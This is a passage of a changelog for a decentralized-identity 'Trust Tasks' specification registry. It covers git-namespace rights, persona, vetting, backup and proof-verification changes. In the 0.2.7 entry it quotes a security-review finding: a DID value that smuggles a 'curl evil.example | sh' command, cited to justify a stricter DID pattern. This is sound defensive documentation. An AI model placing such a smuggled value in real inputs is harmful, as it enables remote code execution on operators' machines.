  spec says so. Invalid examples cover a DID URL, shell metacharacters and a
  list as `subject`.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

- **git-ns**: Re-project roles on demand, and the bridge reports its role map (#639)

* feat(git-ns): re-project roles on demand, and the bridge reports its role map

  A bridge's role map (which forge role own, maintain and commit.sign get)
  is the community's to configure per bridge, forge, namespace and
  repository, but nothing told the VTC what map was in force, and a
  change reached a repository only at its next unrelated projection.

  - git-ns/bridge/event 0.3: a new event type, roleMapReported. The bridge
    reports, per namespace, its role map as the forge applies it (rounded
    onto the forge's ladder: `none` < `read` < `triage` < `write` <
    `maintain` < `admin`), each repository whose map differs (`repos`), and
    each repository whose roles it last projected under a different map
    (`stale`). Sent at start-up, on a map change and after bindCompleted.
    The map has no member for git.ns.admin: a namespace admin projects to
    no forge role whatever the configuration. The VTC refuses an unordered
    map, confines `repos` and `stale` to the namespace, uses the map
    wherever it shows or derives a forge role, and SHOULD re-project each
    stale repository. Everything else is restated unchanged from 0.2; the
    schema pins _shared/0.3, wire-identical for every event shape.

  - git-ns/roles/reproject 0.1 (new): a community administrator, or a
    namespace admin by explicit record, has the VTC send the complete
    desiredRoles of one repository, or of every active or orphaned
    repository in a namespace, again. No right changes and nothing is
    published; the audit record says who asked and why. Refused in manual
    mode (manualMode) and while the bridge has no access (noForgeAccess).

  - git-ns/drift/resolve 0.2 (draft, in place): the projected right of a
    role is the lowest right whose role in the bridge's reported map is
    that role; the default map without a report.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

- **vta/webvh/dids/keys**: Named key roles and per-role rotation for a VTA's DIDs (#638)

* feat(vta/webvh/dids/keys): named key roles and per-role rotation for a VTA's DIDs

  Adds the Trust Tasks every client uses to manage the key roles of the
  did:webvh identities a VTA holds keys for (its own, and those of the
  VTCs and VTNs provisioned on it), aligned with the VTI key-roles draft
  (dtgwg-vti-spec#42): attestation, operational, messaging and update.

- **git-ns/account/unlink**: A member unlinks their own forge account (#636)

* feat(git-ns/account/unlink): a member unlinks their own forge account

  git-ns/account/link said a binding lasts "until the member unlinks or
  leaves", but no task unlinked: the only way to drop an account was to
  link another on the same forge, or to leave the community.

- **git-ns**: Bridge/job 0.4 and namespace/reseat 0.3, a namespace admin gets no forge role (#635)

* feat(git-ns): bridge/job 0.4 and namespace/reseat 0.3 — a namespace admin gets no forge role

  A namespace admin exercises git.ns.admin through the VTC and its bridge,
  never through a forge role: the bridge does not make them an owner of the
  organisation and gives them no role on any repository for it.

  git-ns/bridge/job 0.4:
  - desiredRoles carries, per person, the highest right recorded in their
    own name on the repository (own, maintain or commit.sign there, or
    commit.sign on the namespace), never one held only because git.ns.admin
    implies it. A namespace admin with none is listed at git.ns.admin, which
    every adapter maps to no role, so the bridge takes off a role it manages
    that they still hold. An admin who is also a recorded owner is listed as
    the owner.
  - Each forge account appears in desiredRoles at most once.
  - repo is required for projectRoles: the namespace-level job, which only
    ever projected git.ns.admin as organisation owners, no longer exists.
  - removeAccounts may name an account listed at git.ns.admin.
  - A VTC must not send 0.4 to a bridge that has not shown it takes 0.4, and
    should read an unsupportedType or unsupportedVersion refusal as the
    bridge taking only earlier versions.

  git-ns/namespace/reseat 0.3: step 8 no longer queues a namespace-level
  forge projection. Wire-identical to 0.2.

  Earlier versions are unchanged. Both are draft, so the breaking changes
  ship as MINOR increments under the draft allowance of SPEC 5.2.



### Security

- **didcomm**: A consumer may require a proof over DIDComm (#642)

The DIDComm binding lets a producer omit `proof` because the envelope
  authenticates the sender. A consumer that authorizes on the sender's identity
  now MAY decline that allowance and require an in-band proof on every document
  it accepts over the binding, rejecting a document without one as
  `proofRequired` and one whose proof does not identify the transport sender as
  `identityMismatch`. A producer SHOULD include a proof on every document it
  sends over DIDComm so it is accepted either way.

  The tasks whose consumer authorizes or answers on the caller's identity alone
  now declare `proof` REQUIRED, so the identity rests on the document on every
  transport:

  - vtc/vetting/vetters/profile/0.1
  - vtc/vetting/vetters/resend/0.1
  - vtc/members/personhood/challenge/0.1
  - git-ns/view/0.1, 0.2 and 0.3
  - git-ns/account/link-status/0.1

  All are drafts, edited in place. Bindings regenerated for Rust, TS, Go and
  Dart.

- **proof**: Check a proof's verificationMethod against its proofPurpose (#637)

* security(proof)!: check a proof's verificationMethod against its proofPurpose

  The stock Verifier accepted a proof signed by any key listed under the
  issuer's authentication or assertionMethod, whatever proofPurpose the proof
  declared. It did not check that the verification method's controller was the
  issuer. W3C Data Integrity requires both, through Controlled Identifiers
  v1.0 §3.3.

  - New ProofPurpose type (assertionMethod, authentication,
    capabilityInvocation, capabilityDelegation). Parsing refuses keyAgreement
    and unknown values.
  - New ProofPurposeResolver trait resolves a verificationMethod for one
    purpose. CachedDidResolver implements it. It requires the resolved
    document's id and the method's controller to be the DID that names the
    method. It requires the method to be listed under the relationship the
    purpose names, by absolute DID URL, by a fragment relative to the
    document id, or embedded. DidKeyResolver implements it with did:key's
    implicit relationships: the key named `did:key:<id>#<id>` signs for all
    four purposes, and an X25519 did:key signs for none.
  - Verifier resolves through a ProofPurposeResolver, so every proof is
    checked against its own purpose.
  - New PurposeBound wraps a ProofPurposeResolver as an upstream
    VerificationMethodResolver bound to one proof's purpose. It is for
    callers of DataIntegrityProof::verify.
  - sign_trust_task and ProofExt::sign default to proofPurpose authentication.
    They refuse a purpose that names no signing relationship.
  - Resolver errors name the rule that failed. They carry no DID, document or
    key material.



### Specifications

- **device**: Register the keyExport capability (#643)

keys/export-secret/0.1 authorizes against "standing over the key's
  scope" and leaves the grant's shape to the implementation. Where it is a
  device capability there should be a registered value, as there is for
  roomPresent and roomOpen, so implementations do not each carry a private
  one. The VTA already gates export on it.

  keyExport (key-export in the 0.1 casing) is deliberately separate from
  sign: a producer that may ask the custodian to use a key loses that the
  moment its entitlement changes, while a producer that took the key keeps
  it after its authority is withdrawn. export-secret now names the value
  and says a sign grant is not a keyExport grant. The value is additive,
  so a consumer that does not recognise it ignores it.

  Bindings regenerated (Rust, TS, Go, Dart); no version bumps.

## 0.2.8 — 2026-09-24


### Added

- **backup**: A node-neutral backup and restore family (#633)

`vta/backup/*` is the agent's descriptor-based backup and restore: a slot,
  digests pre-committed before any byte moves, the bundle carried either as an
  HTTPS stream or chunk by chunk over the agent's own Trust Task transport, and a
  finalize step that previews before it replaces. Nothing in that transfer is
  specific to an agent, and a community node needs exactly the same thing for the
  same reason: a backup of any real node is too large for one document, and a
  node that bounds a document's size before checking its proof — as it must on a
  binding that authenticates no sender — cannot accept one that way.
  `vtc/backup/import/0.1`, which carries the whole envelope inline, is the case
  in point.

  This adds `backup/{initiate-export, get-chunk, complete-export,
  initiate-import, put-chunk, finalize-import, abort}/0.1`, derived from the
  latest `vta/backup/*` versions and made node-neutral:

  - The parties, prose and error-code slugs name a node rather than an agent.
  - What a backup contains is the node's to define. `finalize-import`'s
    response replaces the agent-specific `keyCount` / `aclCount` /
    `contextCount` / `auditCount` / `importedSecretCount` with one `counts` map
    keyed by the node's own record kinds — an agent's `keys`, `acl`, `contexts`,
    `audit`, `importedSecrets`; a community's backed-up keyspaces — still
    counts, never contents.
  - The transfer shapes (descriptor, chunk manifest, chunk data, bundle id) are
    referenced from `vta/_shared/0.1/backup-transfer` rather than copied. A copy
    with the node-neutral wording would have been a second definition that the
    TypeScript generator disambiguates by renaming the published `ChunkData`,
    `ChunkSize`, `ChunkManifest`, `ChunkedDescriptor` and `BundleDescriptor`
    exports — a break for every TS consumer, for no difference on the wire.
  - The "Changes from 1.0" history sections are dropped; a new 0.1 has no
    predecessor, and the abstract says where the family came from.

  `vta/backup/*` stays served while agents adopt this family, and
  `vtc/backup/{export,import}` remain for a node small enough to fit one
  document. Retiring the agent-specific versions is a later change.

  Bindings regenerated for Rust, TypeScript, Go and Dart; the only change to
  existing generated code is the new `backup` feature and index entries.



### Specifications

- **auth/step-up**: A step-up bound to one operation needs no session (#631)

`approve-response/0.3` introduced the bound approval — one that authorizes a
  single operation and elevates nothing, answered `recorded` — but
  `approve-request` still required a `sessionId`, and `approve-response` echoed
  one. So the only operations a step-up could be bound to were ones that arrived
  over a session.

  An operation that arrives as a signed Trust Task document has none: its
  authority is its proof. Binding the human's gesture to one of their sessions
  after the fact cannot say which, and a window opened on any of them is one a
  process holding the signer's key can spend on acts the human never saw — the
  same defect as a session elevation standing in for consent.

  - `approve-request/0.3`: `sessionId` is omitted for a step-up bound to an
    operation that arrived without a session, and a relying party MUST NOT fill
    it with a session it chose after the fact. A new `boundTo` names the bound
    operation — for a signed document, a digest of its type and payload salted
    with the challenge, since an unsalted digest over a short, predictable
    payload is a confirmation oracle. A new "Inline delivery" section lets a
    relying party with no push channel carry the request in the refusal of the
    operation it is for (`details.stepUpRequest`); it is authenticated by being
    the relying party's own reply, so a producer must not surface one received
    any other way, and it is for bound step-ups only. The four Security &
    Privacy sub-headings are added.
  - `approve-response/0.4`: `sessionId` is echoed exactly when the request
    carried one, and a response carrying one for a session-less step-up is
    refused (`subjectMismatch`), so a bound approval cannot be read as naming a
    session to elevate. The subject is compared with the subject bound to the
    pending step-up rather than with a session's.

  Both are backward-compatible minors: a required member became optional and an
  optional one was added. Motivated by the community node's signed-document
  step-up (OpenVTC/verifiable-trust-infrastructure#1713) and by
  trustoverip/dtgwg-vti-spec#40, which amends VTI-APV-003 to admit it.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.2.7 — 2026-09-24


### Added

- **git-ns**: Hold every DID to the W3C DID Core syntax (#629)

The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
  anything without whitespace after the method: shell metacharacters,
  quotes, backticks, `/`, `?` and `#`. A security review found that
  `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
  right's subject and later reached a copyable shell command in an admin
  UI.

  git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
  `did:`, a lowercase method name, and a method-specific id of
  colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
  octets, the last one non-empty. No path, query or fragment: every
  member typed `Did` names a party (subjects, owners, grantedBy, a
  transfer's `to`, a job's subjects), never a verification method. No
  other definition changes, and no DID-URL field in the family uses
  `Did`. The framework defines no DID pattern to reuse; issuer and
  recipient are unconstrained VIDs.

  Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
  schema component to be a new component version, so _shared/0.1 and
  0.2 are untouched. Item 3 couples adoption to a new version of each
  consuming specification, and the in-place rule of 5.2 covers only
  re-pins with no wire effect, so each latest spec version that carries
  a `Did` gets a new version. They are all draft, so the breaking
  narrowing ships as a MINOR increment under the draft allowance of 5.2:

    view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
    repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
    repo/transfer 0.2, right/grant 0.2, right/revoke 0.2

  Each restates its predecessor with a "Changes from" section, pins
  _shared/0.3, and links to the newest versions of its siblings. The
  specs that carry no `Did` (account/*, bridge/event, bridge/result,
  namespace/bind, namespace/unbind) are unchanged.

  The six specs with a `Did` in the request gain invalid examples: shell
  metacharacters, whitespace, a `#` fragment and an uppercase method
  (and, for bridge/job, a bad `desiredRoles[].subject`).

  Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
  the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
  exist in two shapes and take family/version-qualified names
  (`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
  still exports them under their own names.

## 0.2.6 — 2026-09-24


### Added

- **git-ns/bridge/event**: Detach on transfer and name reuse, confine events to their namespace (#627)

git-ns/bridge/event 0.2. The wire format is unchanged. What the VTC does
  with three kinds of event changes:

  - repoTransferred always detaches the repository and withdraws its
    rights, wherever `to` is -- another owner, another forge, or another
    namespace, even one the same VTC governs. Rights never move. 0.1
    handled a transfer into a bound namespace as a rename, which let a
    forge-side act hand the receiving namespace's admins owners and
    committers they never chose. The receiving namespace sees the
    repository as repoCreatedUnmanaged, and its admins adopt it and grant
    afresh. Renames within the namespace are unchanged.
  - repoCreatedUnmanaged at a governed name whose forge id differs from
    the recorded one detaches the old repository first (name reuse), so
    the newcomer inherits nothing.
  - Every resource an event names (resource, from, a rename's to, drift
    items) must lie inside the event's namespace, else permissionDenied.
    The one exception is a transfer's `to`: it says where the repository
    went, and nothing is done there.

  drift/resolve 0.1 and bridge/job 0.2 now link to event 0.2. Bindings
  regenerated for Rust, TypeScript, Go and Dart.

## 0.2.5 — 2026-09-24


### Added

- **git-ns**: Drift resolution, namespace reseat, linked accounts in view (#625)

Three follow-ups to the git-ns family. Released versions are untouched;
  every change is a new version folder or a new task.

  - git-ns/view 0.2: the response also carries `accounts`, the forge
    accounts linked to the caller's own DID (ForgeAccount + linkedAt),
    never another member's; narrowed to the resource's forge when
    `resource` is given. Required, empty when none. Everything else is
    restated unchanged from 0.1.

  - git-ns/drift/resolve 0.1 (new): an owner of a repository, explicit or
    implied (so namespace admins too), resolves one reported drift item.
    Drift items have no stable id -- they are recomputed and replaced
    wholesale by every bridge event -- so the item is selected by type,
    plus the account for the three role types (at most one role item per
    account per repository), plus an `observed` guard, required for adopt.
    `adopt` records the right the observed role projects to, evaluated
    exactly as git-ns/right/grant (fixed rules, policy, idempotence);
    refused with accountNotLinked when the account has no member, and
    notAdoptable / noMatchingRight where no right fits. `revert` sends the
    bridge the job that restores the projection.

  - git-ns/bridge/job 0.2: projectRoles gains `removeAccounts`. 0.1 only
    converges roles the bridge manages and reports other roles as drift
    without removing them, so it cannot revert a collaborator added on
    the forge. The rest of the revert table reuses 0.1 jobs.

  - git-ns/namespace/reseat 0.1 (new): a community administrator grants
    git.ns.admin on a headless namespace (no live, unexpired, member-held
    git.ns.admin record) to a current member, with a required audit
    statement. Destructive class; refused with notHeadless otherwise. It
    also states that expiring git.ns.admin records do not count toward
    the last-admin invariant. That rule lives here and is not a new
    right/grant version: 0.1 says nothing about expiring records, so no
    valid document changes meaning.

  - git-ns/_shared 0.2: adds DriftType, the value set a drift selector
    shares with DriftItem.type. DriftItem keeps its inline list so it is
    textually identical to 0.1. That keeps the TypeScript component
    hoisting additive: renaming SharedComponents.DriftItem would have
    been a break.

  The spec forbids declaring consent classes (SPEC 7.3 item 13), so the
  "elevated" impact of reverting an owner-level role is written as a
  consequence and as descriptive impact prose in drift/resolve.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.2.4 — 2026-09-23


### Fixed

- **git-ns/right/grant**: Publish the implied commit right of a namespace admin (#623)

A namespace admin implies ownership of every repository in the namespace,
  and so git.commit.sign on each, but the projection rule named only own and
  maintain records: an admin's commits would have failed every check. The
  VTC now publishes the admin's git.commit.sign on the namespace resource,
  and a bridge that sets up a check configures the namespace as its
  fallback resource so that record counts.

## 0.2.3 — 2026-09-23


### Added

- **git-ns**: Add the git namespaces specification family (#621)

* feat(git-ns): add the git namespaces specification family

  A VTC can say today that a DID may sign commits for an org or a repo, and
  nothing else about git: who owns a repository, who may create one, who may
  merge and who may grant commit rights all live on the forge, and drift from
  the VTC as soon as someone clicks a button. git-ns makes the VTC the source of
  truth for all of it. Rights are per resource, not per role; the Trust Registry
  is the published projection verifiers read, and the forge is the enforced one.

  Five rights, spelled as the TRQP actions the VTC publishes them under:
  git.ns.admin, git.repo.create, git.repo.own, git.repo.maintain and
  git.commit.sign. Resources are forge-qualified and lowercase
  (github.com/acme/widgets, codeberg.org/acme), so a right never crosses forges
  and a community can host where it likes.

  Member- and admin-facing tasks, addressed to the VTC:

  - git-ns/namespace/bind, git-ns/namespace/unbind
  - git-ns/repo/create, git-ns/repo/adopt, git-ns/repo/transfer,
    git-ns/repo/archive
  - git-ns/right/grant, git-ns/right/revoke
  - git-ns/view
  - git-ns/account/link, git-ns/account/link-status

  git-ns/right/grant carries the family's rights model: implied rights, the
  grant-authority table, and six fixed rules a VTC enforces in its own code
  before policy runs, which policy can narrow and never loosen: scope
  containment, no escalation, the last-owner invariant, a last-admin invariant,
  the members-only floor for namespace rights, and policy-may-only-narrow. Each
  refusal has its own error code, declared once at the family level (git-ns:*).

  VTC <-> bridge tasks, for the per-community service that holds the forge
  credentials and the forge adapters:

  - git-ns/bridge/job — seven convergent, forge-neutral job kinds
  - git-ns/bridge/result — exactly one per job, per-step outcomes
  - git-ns/bridge/event — nine forge-neutral event types plus drift

  Shared shapes (resources, namespaces, RepoSummary, RightRecord, drift) live in
  git-ns/_shared/0.1.

  Bindings regenerated for Rust, TypeScript, Go and Dart; conformance checks
  agree. trust-tasks-rs gains a git-ns feature, in all-specs.

## 0.2.2 — 2026-09-23


### Added

- **vtc/vetting/vetters/event-mode**: The exception to the constant drip (#620)

A vetter's ordinary rate is a few tokens a tick, whether or not they have
  vetted anyone. That is the right rate for ordinary weeks and the wrong one for
  a conference desk, and the answer is deliberately not a bigger drip under the
  same key: it is a separate token label for a named event, with its own rate,
  its own expiry, and a group of vetters large enough that a spend under it still
  hides one.

  This task carries the vetter's half of that, which is only ever a request. The
  approval is an act by someone else, through the community's own administrative
  surface, and the specification says why there is no Trust Task for it: a task
  the vetter could send is a task a vetter could be made to send.

  The response says where the request stands, and carries a group *count* rather
  than a group. Who else is at the event is the anonymity set, so the number is
  the most a member may be told — enough to tell "nobody has approved it" from
  "not enough people have asked", which are the two reasons a request waits.

- **vetting/attestation**: The four tasks hidden-vetter admission needs (#618)

* feat(vetting/attestation): the four tasks hidden-vetter admission needs

  A community can hide which of its vetters vetted an applicant: the vetter
  attests under a blind class credential, the applicant proves that k distinct
  holders of one attested it, and the community counts the proof with the rule
  it already counts named statements with. What was missing was the wire.

  Four specifications, and the split between them is the design:

  - vtc/vetting/vetters/pcs-root — a vetter enrols for a class label. The
    community checks its own records (a live vetter grant, no credential under
    this label yet, the identifier it was bound to) and signs a commitment it
    cannot open. Being named happens here, once per label, and nowhere else on
    the path.
  - vtc/vetting/vetters/pcs-tokens — the vetter draws its tick of attestation
    tokens, unconditionally and at a published rate. A draw that tracked demand
    would report activity, which is what the exchange exists to hide; the quota
    is the community's to enforce, never the asker's restraint.
  - vetting/attestation — vetter to applicant, carrying the facts of the session
    and no issuer. The delivering identity is deliberately NOT what makes it
    count, and a consumer is told not to record it beside the attestation: that
    would recreate, in the applicant's own store, the link the exchange removes.
  - vtc/vetting/pcs-challenge — the applicant asks the community for the
    single-use nonce its proof must bind. Without it a proof verifies as often
    as it is submitted, and the second submission counts as readily as the first.

  vetting/attestation declares identifierScope: any. Nothing in it needs a
  reusable identifier — the community never sees the document, and the applicant
  only needs the identifier the session was held under — so a pair that runs the
  whole vetting exchange pairwise loses nothing.

  Bindings regenerated for all four languages; conformance checks agree.

## 0.2.1 — 2026-09-23


### Added

- **persona**: Attribute/get — read one attribute, by identifier (#616)

The family had no narrow read, and the shape of the workaround is the
  argument for the task. A client revealing one value called
  `persona/attribute/list` with a `typePrefix` and `includeValues`, then
  filtered to the id it already held — so showing one email address
  decrypted and returned every email address the holder has, and the audit
  trail recorded a listing of the pool rather than a decision about one
  fact.

  - Values are withheld unless asked for, and a `sensitivity: high` value
    needs a second flag, on the same two-step as `attribute/list`. A
    withheld value is stated (`valueWithheld`), never left to inference: a
    consumer reading an absent value as "there is none" shows the holder an
    empty field where their passport number is.
  - `version` reads a retained earlier version, which is what makes "what
    did I show them in March" answerable — a disclosure record and a pinned
    entry both name one. A purged version is `versionPurged`, never a
    silent fall back to the current value.
  - `retainedVersions` names the versions still held, so a holder deciding
    whether to purge can see what purging would take away rather than being
    asked to make an irreversible decision blind.

  One identifier, never a list: a maintainer that accepted several would
  recreate the enumeration the task exists to avoid, one call later.

## 0.2.0 — 2026-09-23

## 0.1.19 — 2026-09-23


### Added

- **vtc/vetting/vetters/show**: A by-DID vetter status lookup (#603)

* feat(vtc/vetting/vetters/show): a by-DID vetter status lookup

  The vetter listing omits a vetter with no published profile and one whose
  grant was revoked in exactly the same way: both are simply absent. So an
  applicant whose vetter has gone quiet cannot tell which happened, and a
  vetter cannot check their own standing at all. The only way to find out
  today is to read the grant credential's status list, which needs the
  credential in hand.

  `vtc/vetting/vetters/show/0.1` answers by DID with one of `live`, `revoked`,
  `expired` or `none`, plus the grant id, the timestamp that ended or will end
  it, and — for a live grant — whether the vetter is listed, which is what
  separates "unlisted by choice" from "not a vetter".

  A new task rather than a `status` member on the listing response: adding a
  member to an existing response breaks consumers that reject unknown members,
  and the two answer different questions.

  `revoked` outranks `expired` where both hold, because withdrawal and lapse
  are different statements. `none` deliberately does not distinguish a
  non-member from a member who is not a vetter — the caller asked about
  vetting — and the revocation reason is not carried at all, including through
  `ext`.

  Rust, TypeScript and Go bindings regenerated.

## 0.1.18 — 2026-09-22


### Added

- **specs**: Add the ExtCritical framework def, and open vetting requirements to ext (#600)

A community publishing an admission mode the join manifest does not
  enumerate has had two options: put the parameters in an undeclared
  member of `vetting` and watch them vanish, or wait for a version of the
  manifest that names them. This adds the third.

  framework 0.4 (specs/_framework/0.4/framework.schema.json)
    Additive over 0.3: `Ext` and `DigestMultibase` carried forward
    unchanged, `ExtCritical` new — the array naming the `ext` namespaces
    a consumer must understand or refuse, per the framework change in
    trustoverip/dtgwg-trust-tasks-spec#23. Neither rule it carries is
    checkable by JSON Schema: that an entry names a namespace present in
    the sibling `ext` is checkable only against that sibling, and whether
    a namespace is load-bearing is not a schema question. The $def says
    so, and both are consumer-side checks.

  vtc/join-requests/manifest 0.2 (draft, edited in place per SPEC §5.2)
    `vetting` gains `ext` and `extCritical`, and this draft's framework
    $refs re-pin from 0.2 to 0.4, errata-style.

    `vetting` was already `additionalProperties: true`, so an undeclared
    member always validated. Validating is not arriving: a generated type
    names the members the schema declares and drops the rest, so the
    member was parsed and discarded, and discarded again on the
    re-serialization `requirementsDigest` is computed over — a reader
    recomputing the digest from what it parsed got a value that did not
    match what it was sent. A declared member survives both.

    A new response example shows a criterion carrying hidden-vetting
    parameters under a namespace it controls, marked critical because an
    applicant that ignored it would gather named statements and present
    them to a criterion whose purpose is that it never receives them. Its
    `requirementsDigest` is the real value for the criterion as printed.

  Generated bindings regenerated: 472 specs across TypeScript, Rust, Go
  and Dart all agree. `npm run validate` passes 472 specs; the manifest's
  validate-gated fixtures run 5 tests; `cargo test --workspace` is 927.



### Documentation

- **specs**: Sign examples with eddsa-jcs-2022 (#599)

* docs(specs): sign examples with eddsa-jcs-2022

  30 draft specifications' examples carried "cryptosuite":
  "eddsa-rdfc-2022", while the reference ecosystem signs with
  eddsa-jcs-2022. Both suites are conformant, but implementers copy
  examples, and the two canonicalize differently. Raised by NAOMS against
  acl/change-role/0.1 (framework spec PR #21 makes the same fix to the
  framework's own examples).

  Editorial, made in place per CONTRIBUTING-SPECS: examples only, no
  schema or wire change, no version folder. The 20 retired specifications
  that carry the same example are frozen (SPEC §6.4) and left as they are.

## 0.1.17 — 2026-09-22


### Added

- **persona**: Wear a face without naming a persona DID (#589)

Design note (VTI docs/05-design-notes/persona-context-first.md) §9.7: a
  holder should say "wear this face here", not bring a DID.

## 0.1.16 — 2026-09-22


### Added

- **persona**: Derived provenance, and endorsements as inventory (#582)

Design note (VTI docs/05-design-notes/persona-context-first.md) §5.7.

  Provenance gains `derived` {source, derivedAt}: a value taken from a
  source the holder connected or supplied — a code-hosting profile, an
  uploaded CV — that the holder did not type and no issuer signed. It is
  the holder's claim that the source said so, and a consumer must not
  present it as attested. `source` names the KIND of source (`github`,
  `cvUpload`), never a handle or URL: provenance reaches the verifier, and
  a handle there would disclose an identifier the holder never chose to
  share. For how strongly a disclosed value identifies the holder the
  kinds rank credentialBacked > derived > selfAsserted. The preview's
  provenance enum gains `derived`.

  Attribute gains `endorsements`: vault ids of credentials in which a
  third party endorses the value. Inventory, not evidence — a vouched
  self-assertion is still self-asserted, and folding a vouch into
  provenance would render it as attested. Not disclosed with the value.
  attribute/put takes it and refuses an id the vault does not hold
  (`endorsementNotFound`).

- **spec**: Vtc/invitations/deliver/0.1 — get an invitation to the DID it admits (#581)

Keyring VTI-21 and VTI-32. `vtc/invitations/issue` returns the signed
  invitation to the inviter once, and nothing carried it further: an
  invitee was reached only by whatever the inviter improvised, and the
  credential is too large for a QR code.

  This task delivers an issued invitation over the credential-exchange
  family the framework already has. On `message` the community sends a
  `credential-exchange/offer` to the invited DID over a transport it
  advertises (`noRoute` if none); on `offer` it returns the OID4VCI offer
  for the inviter to hand over — small, because it names the credential
  rather than containing it. Either way the invitee redeems with
  `credential-exchange/request`, and the credential is released only for a
  key-binding proof by the invited DID's key, so a photographed QR code
  admits no one else. At most one offer per invitation is live; the
  invitation credential never appears in this task's response.

  Bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.1.15 — 2026-09-22


### Added

- **persona**: Where a face may be worn, where it is, and what it has done (#577)

* feat(persona): where a face may be worn, where it is, and what it has done

  Design note (VTI docs/05-design-notes/persona-context-first.md) §5.4 and
  §9.6, and `until` on compose.

  FaceReach — a pool face may carry `reach`: `{kind: anywhere}` (the
  default, and what absent means) or `{kind: only, contextIds: [...]}`.
  binding/set refuses to wear a face outside it (`outsideReach`), and
  profile/put refuses to narrow it past a context the face is worn in now
  (`boundOutsideReach`, naming them). A tagged object rather than a bare
  context list, so "unrestricted" and "nowhere" cannot be confused: `only`
  needs at least one context, and nowhere is a retired face.

  persona/profile/usage/1.0 — where one face is worn now, with each
  binding's `until` and the face's reach beside them. Holder-only: it is
  the map of which personas are one face.

  persona/profile/timeline/1.0 — one face's history joined, oldest first:
  composed, worn, unworn, expired, disclosed, valueChanged, promoted,
  retired, reinstated. Never a value and never a private label. A
  maintainer records from now on what it would not otherwise keep — a
  binding taken off leaves no trace in the one that replaces it — and may
  omit what happened before and left no record.

  profile/compose takes `until`, for the face composed at the door of a
  conference; `untilNotFuture` refuses one in the past or without a
  personaDid.

## 0.1.14 — 2026-09-21


### Added

- **trust-task-discovery**: Publish 0.2 with a three-part frameworkVersion (#571)

trust-task-discovery/0.1's response admits frameworkVersion only as
  MAJOR.MINOR, so a responder cannot advertise a framework release as the
  framework has written it since 0.4.0 (SPEC §5.1.1) — 0.6.0, or a later
  PATCH. Widening 0.1 in place would make every 0.1 discoverer that
  validates the response reject a conforming one, so this is 0.2.

  - specs/trust-task-discovery/0.2: identical to 0.1 except the response's
    frameworkVersion is MAJOR.MINOR.PATCH; adds "Relationship to 0.1"
    (answer each version in the version asked; discoverers SHOULD ask 0.2)
    and the four Security & Privacy sub-sections. Bindings generated.
  - trust-tasks-rs: DiscoveryRegistry::respond_to_v0_2; the configured
    release is held three-part and written MAJOR.MINOR in a 0.1 response.
    Default "0.2" (stale) -> "0.6.0".
  - trust-tasks-https: with_discovery/enable_discovery answer both 0.1 and
    0.2, and advertise both.
  - trust-tasks-dart-https: enableDiscovery answers both versions; default
    frameworkVersion '0.5' -> '0.6.0'; example asks in 0.2.

- **persona**: Retire a face, warn before deleting one, and let a binding end on its own (#570)

Removing a face means one of three things to the person doing it, and
  the family had tasks for two: "not here" (a null binding/set) and "gone"
  (profile/delete). This adds the middle one.

  persona/profile/retire/1.0 — stop being a face everywhere and keep it.
  Every binding to it is cleared and reported, it drops out of pickers and
  default listings (profile/list `includeRetired`), and binding/set and
  local/binding/set refuse it (`profileRetired`). Values and disclosure
  history are kept. persona/profile/reinstate/1.0 undoes it and binds
  nothing: wearing a face in a context is decided in that context.
  Profile gains `status` and `retiredAt`.

  profile/get and profile/delete return `disclosedTo` {partyCount,
  contextCount}, and the delete spec tells a producer to show it before
  sending: deleting a face does not un-tell anyone.

  binding/set and local/binding/set take `until`; binding/get and
  binding/list return it. At expiry the binding clears and, when the face
  is then worn nowhere, it is retired — never deleted, and never retired
  while another context still wears it. `untilNotFuture` refuses a past
  `until` or one with a null profileId.

## 0.1.13 — 2026-09-21

## 0.1.12 — 2026-09-21


### Added

- **messaging**: Add mediator queue, message, stats and traffic-monitor specifications (#549)

Ten new messaging/* tasks (all 0.1, draft) so a mediator can be operated
  entirely through Trust Tasks — by an administrator across every account, or
  by an account controller over its own queues — instead of the REST
  `/admin/status`, `/purge` and `/queue/status` routes and the retired DIDComm
  admin protocols.



### Other

- Declare outcome evidence for witness/session and vetting/session (#550)

Implements framework §7.3 item 20 in the registry
(trustoverip/dtgwg-trust-tasks-spec#15 and #17).

- spec.meta.schema.json: optional `outcomeEvidence` key (response Type
  URI, binding by id + task digest or by fresh challenge, rationale).
  Excluded from every binding generator, so no codegen change.
- build-registry: checkOutcomeEvidence fails the build when the declared
  response is missing, lacks a response payload, or does not require
  proof and issuedAt (20.1-20.3); when the initiating spec is bearer or
  has no REQUIRED recipient; or when a binding pointer names an
  undeclared payload member (20.5). Warns when retention is not durable.
- witness/session/0.1 declares witness/session/submit#response, bound
  by the VWC's taskContext and taskDigestMultibase.
- vetting/session/0.1 declares its own #response, bound by the card's
  challenge; permitted under 20.5.2 because the statement's issuer is
  the session's issuer.
- witness/session/submit/0.1 cites SPEC §4.9.4 instead of its own
  pairing rule, keeping only the witnessing-specific checks.
- SPEC.md mirror: §4.9.4, §7.3 item 20, the outcome-evidence term, the
  §10 correlator paragraph and the [VTI] reference, ported from the
  canonical repo.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

## 0.1.11 — 2026-09-21


### Added

- **vtc**: A community can ask an applicant to tell it about themselves (#543)

From the persona context-first design note (verifiable-trust-infrastructure,
  docs/05-design-notes/persona-context-first.md §5.2): a join manifest could
  ask only for credentials, so a community wanting a display name and a
  country had nothing to put on the "what's required" screen, and nothing
  connected the join ceremony to the applicant's persona.

  All additive, no new versions:

  - vtc/join-requests/manifest/0.2: optional `requestedAttributes` --
    claim types (never values), each `required` (default true) with a
    `purpose` shown to the applicant. Outside every criterion, so no
    requirementsDigest covers it. Answers are self-asserted: a community
    MUST NOT describe one as verified or decide as if it were; a community
